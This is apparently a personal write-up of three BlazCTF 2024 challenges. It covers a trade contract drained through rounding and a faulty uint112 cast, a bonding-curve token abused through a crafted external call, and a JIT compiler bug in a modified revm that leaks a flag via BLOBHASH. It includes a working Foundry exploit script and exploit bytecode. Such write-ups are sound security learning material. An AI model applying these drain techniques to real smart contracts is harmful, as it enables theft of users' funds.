# BlazCTF 2024 Writeup

- Official challenges repo: [link](https://github.com/fuzzland/blazctf-2024)
- Full write up from DeFiHackLabs team: [link](https://github.com/DeFiHackLabs/blazctf-2024-writeup)

Following is the writeup for the challenges I solved in BlazCTF 2024.

## [8Inch](https://github.com/fuzzland/blazctf-2024/tree/main/eight-inch)

In this challenge, we are presented with a trade settlement contract where a trade has been created with the sell token `WOJAK` and the buy token `WETH`. The objective is to drain all `WOJAK` tokens and transfer them to the `0xc0ffee` address.

Within the `createTrade` function, the contract subtracts a `fee` from `_amountToSell` and records it in `trades[tradeId].amountToSell`. The entire amount of `WOJAK` tokens is transferred to the contract. In the `settleTrade` function, only the subtracted amount of `WOJAK` tokens can be transferred to the buyer, meaning we cannot directly drain all `WOJAK` tokens.

There is an issue in the `settleTrade` function where the buy amount to be transferred is rounded down:

```solidity
uint256 tradeAmount = _amountToSettle * trade.amountToBuy;
require(
    IERC20(trade.tokenToBuy).transferFrom(
        msg.sender,
        trade.maker,
        tradeAmount / trade.amountToSell
    ),
    "Buy transfer failed"
);
```

This means we can obtain 9 wei of `WOJAK` tokens by calling `settleTrade` with `_amountToSettle = 9`, without needing to provide any `WETH` tokens.

Additionally, there is an issue in the `SafeUint112` library that allows the value `1<<112` to be converted into `0`:

```solidity
/// @dev safeCast is a function that converts a uint256 to a uint112 and reverts on overflow
function safeCast(uint256 value) internal pure returns (uint112) {
    require(value <= (1 << 112), "SafeUint112: value exceeds uint112 max");
    return uint112(value);
}
```

We can exploit this vulnerability by setting a value to exactly `1<<112`, causing it to be converted to `0`.

Another suspicious function in the contract is `scaleTrade`. This function scales `amountToSell` and `amountToBuy` by multiplying them by a `scale` value, likely to trigger the overflow issue in `SafeUint112`. The critical part we need to bypass is the `originalAmountToSell < newAmountNeededWithFee` condition, as we do not possess any `WOJAK` tokens for the contract to transfer from us. Therefore, we need to make `newAmountNeededWithFee = 0` to bypass this condition. This can be achieved by setting `scale` such that `scale * originalAmountToSell + fee = 1<<112`.

```solidity
trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));
trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));
uint256 newAmountNeededWithFee = safeCast(
    safeMul(originalAmountToSell, scale) + fee
);
if (originalAmountToSell < newAmountNeededWithFee) {
    require(
        IERC20(trade.tokenToSell).transferFrom(
            msg.sender,
            address(this),
            newAmountNeededWithFee - originalAmountToSell
        ),
        "Transfer failed"
    );
}
```

However, we cannot directly manipulate the existing `trade` because our address is not the maker:

```solidity
require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
```

Thus, we must create a new trade and attempt to drain all `WOJAK` tokens. The new trade must use `WOJAK` as the sell token because we want it to transfer `WOJAK` tokens out when calling `settleTrade`. Combined with the first issue, we can first obtain a small amount of `WOJAK` tokens from the contract, then create a new trade with `WOJAK` as the sell token.

The complete exploit strategy is as follows:

1. Drain 32 wei of `WOJAK` tokens from the contract with 4 calls to `settleTrade`.
2. Create a new trade with 32 wei of `WOJAK` as the sell token and any token as the buy token. The contract will record `amountToSell` as `32 - fee`, which is `2`.
3. Scale the trade with `scale = ((1 << 112) - 30) / 2` to make `tokenToSell` a large value, thereby bypassing the `originalAmountToSell < newAmountNeededWithFee` condition.
4. Settle the trade with `_amountToSettle = 10 ether`, which will transfer `10 ether` of `WOJAK` tokens to the contract.

Script:

```solidity
function run() public {
    vm.startBroadcast();

    t.settleTrade(0, 9);
    t.settleTrade(0, 9);
    t.settleTrade(0, 9);
    t.settleTrade(0, 5);
    SimpleERC20 weth2 = new SimpleERC20(
        "Wrapped Ether 2",
        "WETH2",
        18,
        10 ether
    );
    wojak.approve(address(t), 100);
    t.createTrade(address(wojak), address(weth2), 32, 0);
    t.scaleTrade(1, ((1 << 112) - 30) / 2);
    t.settleTrade(1, 10 ether);
    console.log("balance of wojak", wojak.balanceOf(user));
    wojak.transfer(address(0xc0ffee), 10 ether);
    vm.stopBroadcast();
}
```

## [Doju](https://github.com/fuzzland/blazctf-2024/tree/main/doju)

In this challenge, we are presented with two Solidity contracts: **Doju** and **Challenge**. The Doju contract implements a bonding curve token, and the Challenge contract interacts with it. Our goal is to exploit a vulnerability in the Doju contract to increase the balance of the `0xc0ffee` address beyond half of the maximum `uint256` value.

The Doju contract is a simplified ERC20 token with a bonding curve mechanism for buying and selling tokens:

- **Buying Tokens**: Users can buy tokens by sending ETH to the contract. The amount of tokens minted is determined by a bonding curve formula in the `_ethToTokens` function.
- **Selling Tokens**: Users can sell tokens back to the contract in exchange for ETH, using the bonding curve formula in the `_tokensToEth` function.

Key functions in the contract:

- `buyTokens(address to)`: Mints new tokens based on the amount of ETH sent.
- `sellTokens(uint256 tokenAmount, address to, uint256 minOut)`: Burns tokens and sends ETH back to the user.
- `transfer(address to, uint256 value)`: Transfers tokens to another address or triggers a sell if the to address is the burn address (address(0)).

The bonding curve ensures that the token price increases as the total supply increases and decreases as the supply decreases. And the Challenge contract has a function isSolved() that checks if the balance of 0xc0ffee is greater than half of the maximum uint256 value:

```solidity
function isSolved() public view returns (bool) {
    return doju.balanceOf(address(0xc0ffee)) > type(uint256).max / 2;
}
```

### Observation

One might consider force-sending ETH to the Doju contract (e.g., via selfdestruct) to manipulate the bonding curve calculations. However, this approach doesn’t provide a practical way to drain or mint a large number of Doju tokens due to the bonding curve’s mathematical constraints.

However, the critical vulnerability lies within the sellTokens function:

```solidity
function sellTokens(uint256 tokenAmount, address to, uint256 minOut) public {
    uint256 ethValue = _tokensToEth(tokenAmount);
    _transfer(msg.sender, address(this), tokenAmount);
    totalSupply -= tokenAmount;
    (bool success,) = payable(to).call{value: ethValue}(abi.encodePacked(minOut, to, tokenAmount, msg.sender, ethValue));
    require(minOut > ethValue, "minOut not met");
    require(success, "Transfer failed");
    emit Burn(msg.sender, tokenAmount);
    emit Transfer(msg.sender, address(0), tokenAmount);
}
```

1. Arbitrary External Call: The contract performs a low-level call to the to address with controlled data and forwards ETH (ethValue).
1. Ineffective minOut Check: The require(minOut > ethValue, "minOut not met"); condition is illogical because minOut should be less than or equal to ethValue to ensure the user receives at least minOut. This condition can be bypassed by setting minOut to a high value.

### Exploit

Our plan is to exploit the arbitrary external call to make the Doju contract call its own transfer function with controlled parameters, transferring a massive amount of tokens to the 0xc0ffee address. We need to carefully construct the data passed to the call so that when the Doju contract executes it, it interprets it as a call to `transfer(address to, uint256 value)`. The call uses abi.encodePacked:

```solidity
abi.encodePacked(minOut, to, tokenAmount, msg.sender, ethValue)
```

We can control minOut and tokenAmount, and `to` should be set as the contract's address. Our goal is to set up the data so that:

- The first 4 bytes correspond to the function selector of `transfer(address,uint256)`.
- The next 32 bytes is an address that we have control over.
- The following 32 bytes represent the value, which we’ll set to a large number.

So we can set the first 4 bytes of `minOut` are to be `0xa9059cbb` which is the function selector of `transfer(address,uint256)`. And the last 16 bytes plus the first 4 bytes of `to` should be an address that we have control over. We can use tools like [Profanity2](https://github.com/1inch/profanity2) to generate the address with given suffix. And the last 16 bytes of `to` will be interpreted as the amount to transfer, so can set `tokenAmount` = 0 to let the contract transfer a large amount of Doju token out.

## [I Love REVMC](https://github.com/fuzzland/blazctf-2024/tree/main/i-love-revmc)

### Background

In this challenge, we have a modified version of `anvil` and `revm`, where a JIT compiler feature is added. This feature is enabled by `revmc` crate. Following is the main modifications.

### foundry and anvil

- Dependencies about `revm` is updated to local path, and `revmc` is added. Besides, `optional_balance_check` and `optional_disable_eip3074` features are enabled for `revm` in `anvil`.
- A new JSON RPC method `blaz_jitCompile` is added to compile contract's bytecode into a shared library. It will execute `jit-compiler` command to compile bytecode into library.

    ```rust
    // some code is omitted for brevity
    let code = self.get_code(addr, None).await?;
    let mut prev_jit_addr = self.jit_addr.write().await;
    std::fs::write("/tmp/code.hex", hex::encode(code)).map_err(|e| {
        BlockchainError::Internal(format!("Failed to write code to /tmp/code.hex: {e}"))
    })?;

    let jit_compiler_path =
        std::env::var("JIT_COMPILER_PATH").unwrap_or_else(|_| "/opt/jit-compiler".to_string());
    let output = std::process::Command::new(jit_compiler_path)
        .output()
        .map_err(|e| BlockchainError::Internal(format!("Failed to run jit-compile: {e}")))?;
    ```

- After that, `jit_addr` will be set in anvil backend, and `new_evm_with_jit` will be used to process new transaction in `executor.rs`
- In new tx processing logic, it uses `JitHelper::get_function` to override existing `get_function` in `inspector.rs`
- In `JitHelper`, it dynamically loads `libjit.so`, calls `jit_init` with some functino pointers to initialize it, then returns `real_jit_fn` as `EvmCompilerFn`. This fundction should be called somewhere when a tx is executed.

    ```rust
    // some code is omitted for brevity
    // open libjit.so
    let libjit = libc::dlopen(b"libjit.so\0".as_ptr() as *const libc::c_char, libc::RTLD_LAZY);
    let jit_init = libc::dlsym(libjit, b"jit_init\0".as_ptr() as *const libc::c_char);
    let mut funcs: [*mut libc::c_void; 40] = [
      revmc_builtins::__revmc_builtin_panic as _,
      // more functions ...
    ];
    let jit_init: extern "C" fn(*mut *mut libc::c_void) = std::mem::transmute(jit_init);
    jit_init(funcs.as_mut_ptr());

    let func = libc::dlsym(libjit, b"real_jit_fn\0".as_ptr() as *const libc::c_char);
    let func: RawEvmCompilerFn = std::mem::transmute(func);
    return Some(EvmCompilerFn::from(func));
    ```

### revm and revmc

- A field `disable_authorization` is added to `TxEnv` when `optional_disable_eip3074` feature is enabled, and `disable_balance_check` is moved up in `CfgEnv`
- In `translate_inst` inside `revmc`, which is the core logic of translating bytecode into IR (internal representation), it modifies the logic of processing `op::BLOBHASH` insturction to use `build_blobhash`.
- In `build_blobhash`, it has complex logic of building IR code for reading blob hash. It calculates the memory offset to read length from `blob_hashes` field in `TxEnv`, checks whether it's out of bounds, gets the element pointer of desired blob hash item, reads and returns it.

### JIT Compiler

- In `linker.c` it declares many function pointers in `linker.c` like `__revmc_builtin_gas_price_ptr` and `__revmc_builtin_balance_ptr`, which are `0` and will be set by `jit_init()`
- In `load_flag()` it reads the flag and store it at memory address `0x13370000`
- According to `anvil-image/build.sh`, `linker.c` will be compiled into `libjit_dummy.o`
- In JIT compiler's main logic `main.rs`, it reads from `/tmp/code.hex` and use `EvmCompiler` from `revmc` to compile it into `/tmp/libjit_main.o`, which is the implementation of `real_jit_fn`.
- Then it's combined with `/tmp/libjit_dummy.o` to produce final shared library `/lib/libjit.so`

### Analysis

We can understand the whole flow now:

1. Deploy a smart contract
1. Call `blaz_jitCompile` to compile it. It executes pre-compiled `jit-compiler` binary which does the following:
    - Read the smart contract's bytecode and use `revmc` to translate each EVM op code into IR code.
    - The IR code is compiled into `real_jit_fn` of the shared library `/lib/libjit.so`
1. Submit a transaction with `to` address being the malicious contract
1. `real_jit_fn` will be called with some arguments related to current transaction. The program logic written by `jit-compiler` is executed at this step.
    - During execution of `real_jit_fn`, it can call some `revmc` built-in functions to interact with Rust code
1. We need to find a way to let `real_jit_fn` read the flag from memory `0x13370000`.

Because `real_jit_fn` is compiled from IR code generated by `revmc`, we need to find bug in `revmc` which may generate wrong IR code and cause out of bounds memory read. The only modified implementation in `revmc` is `BLOBHASH` op code, so we should investigate its logic.

```rust
fn build_blobhash(&mut self) {
    let index = self.bcx.fn_param(0);
    let env = self.bcx.fn_param(1);
    let isize_type = self.isize_type;
    let word_type = self.word_type;

    let tx_env_offset = mem::offset_of!(Env, tx);
    let blobhash_offset = mem::offset_of!(TxEnv, blob_hashes);
    let blobhash_len_offset = mem::offset_of!(pf::Vec<revm_primitives::B256>, len);
    let blobhash_ptr_offset = mem::offset_of!(pf::Vec<revm_primitives::B256>, ptr);

    let blobhash_len_ptr = self.get_field(
        env,
        tx_env_offset + blobhash_offset + blobhash_len_offset,
        "env.tx.blobhashes.len.addr",
    );
    let blobhash_ptr_ptr = self.get_field(
        env,
        tx_env_offset + blobhash_offset + blobhash_ptr_offset,
        "env.tx.blobhashes.ptr.addr",
    );

    let blobhash_len = self.bcx.load(isize_type, blobhash_len_ptr, "env.tx.blobhashes.len");
    // convert to u256
    let blobhash_len = self.bcx.zext(word_type, blobhash_len);

    // check for out of bounds
    let in_bounds = self.bcx.icmp(IntCC::UnsignedLessThan, index, blobhash_len);
    let zero = self.bcx.iconst_256(U256::ZERO);

    // if out of bounds, return 0
    let r = self.bcx.lazy_select(
        in_bounds,
        word_type,
        |bcx| {
            let index = bcx.ireduce(isize_type, index);
            let blobhash_ptr =
                bcx.load(self.ptr_type, blobhash_ptr_ptr, "env.tx.blobhashes.ptr");

            let address = bcx.gep(word_type, blobhash_ptr, &[index], "blobhash.addr");
            let tmp = bcx.new_stack_slot(word_type, "blobhash.addr");
            tmp.store(bcx, zero);
            let tmp_addr = tmp.addr(bcx);
            let tmp_word_size = bcx.iconst(isize_type, 32);
            bcx.memcpy(tmp_addr, address, tmp_word_size);

            let mut value = tmp.load(bcx, "blobhash.i256");
            if cfg!(target_endian = "little") {
                value = bcx.bswap(value);
            }
            value
        },
        |_bcx| zero,
    );

    self.bcx.ret(&[r]);
}
```

Its main logic is:

1. Determine the memory offset of length of `blob_hashes` in `Env`. It's calculated by finding offset of `Tx` struct in `Env`, then adding offsets of `blob_hashes` field in `Tx`, then adding offset of `len` field in `blob_hashes`.
1. Same logic is used to get `blob_hashes`'s pointer to its first item.
1. Reads length of `blob_hashes` from `blobhash_len_ptr`, and build an if condition based on whether `index` is out of bounds.
1. If out of bounds, it returns 0. Otherwise it reads the `blob_hashes` item at `index` and returns it.
1. The memory address of `blob_hashes[i]` is calculated by `blobhash_ptr + 32 * index`.

The intersting part is that this code is building another program to be executed at transaction runtime, so when building IR code for `BLOBHASH` operation, it doesn't know the exact input of `Env` and `index`, and build some symbolic logic to handle them. Therefore, if the calculated memory address of `blob_hashes[i]` is not as expected, it will trigger out of bounds memory read.

### The Bug (Spoiler)

The calculation of `blob_hashes[i]` memory address is incorrect. At the compile time of bytecode, it's using pre-compiled `jit-compiler` binary, which depends on `revm` and `revmc` crates with no other feature flags turned on. However at runtime, `anvil` has enabled several features like `optional_disable_eip3074`, `optional_balance_check` for `revm`, which introduces memory layout shift in `CfgEnv` and `TxEnv`.

```rust
struct CfgEnv {
    // ...
    /// Skip balance checks if true. Adds transaction cost to balance to ensure execution doesn't fail.
    #[cfg(feature = "optional_balance_check")]
    pub disable_balance_check: bool,
    // ...
    #[cfg(feature = "optional_eip3607")]
    pub disable_eip3607: bool,
    // ...
}

struct TxEnv {
    // ...
    /// Disable authorization
    #[cfg(feature = "optional_disable_eip3074")]
    pub disable_authorization: bool,
    // ...
}
```

At runtime the size of `CfgEnv` and `TxEnv` are larger than the size when building IR code, so the memory address of `blob_hashes` field in `TxEnv` is different. After printing the struct and size, we can find the actual shift is 48 bytes, which means `blob_hashes` field in `TxEnv` is 48 bytes ahead of the expected position of JIT Compiler. It makes the calculated memory address of `blob_hashes[i]` pointing to the previous field in `TxEnv`, which is `gas_priority_fee`.

```txt
+---------------------------------+--------------------+--------------------+-----------------+
| gas_priority_fee (40 bytes)     | capacity (8 bytes) |  pointer (8 bytes) | length (8 bytes)|
+---------------------------------+--------------------+--------------------+-----------------+
```

After the memory shift, when it reads `blob_hashes` length it actually reads the 9th to 16th bytes of `gas_priority_fee`. As for `blob_hashes` element pointer, it reads the 1st to 8th bytes of `gas_priority_fee`. Therefore, we can control the value of `gas_priority_fee` to bypass the length check and make it read the flag!

### Exploit

To read `0x13370000` memory address, we can set `index = 0` and let it reads `0x13370000` from `blobhash_ptr`. Also, `gas_priority_fee` should be at least `2**64` so it can read `1` for `blobhash_len` to bypass the length check. This will make `BLOBHASH` op code returns the memory content of `0x13370000` to EVM stack. The remaining steps are trying to leak the stack element.

### My Solution

The bytecode I used is `5f496004351c60011660145760015f5260205ff35b5f5ffd`:

```txt
[00] PUSH0 
[01] BLOBHASH 
[02] PUSH1          04
[04] CALLDATALOAD 
[05] SHR 
[06] PUSH1          01
[08] AND 
[09] PUSH1          14
[0b] JUMPI 
[0c] PUSH1          01
[0e] PUSH0 
[0f] MSTORE 
[10] PUSH1          20
[12] PUSH0 
[13] RETURN 
[14] JUMPDEST 
[15] PUSH0 
[16] PUSH0 
[17] REVERT
```

It will call BLOBHASH with `index = 0`, and shift the result based on call data to leak one bit of stack element. The transaction will be reverted if the `i`-th bit of the stack element is `1`. When sending transaction, we need to set max priority fee to `2**64 + 0x13370000` to meet the above condition. After sending 256 transactions, we can recover the full flag.

After I checked the official solution, I found that it just uses `LOG0` to log the stack element, which is more efficient!

`6008600a5f3960095ff35f495f5260205fa000`

```txt
[02] PUSH1      0a
[04] PUSH0 
[05] CODECOPY 
[06] PUSH1      09
[08] PUSH0 
[09] RETURN 
[0a] PUSH0 
[0b] BLOBHASH 
[0c] PUSH0 
[0d] MSTORE 
[0e] PUSH1      20
[10] PUSH0 
[11] LOG0 
[12] STOP
```
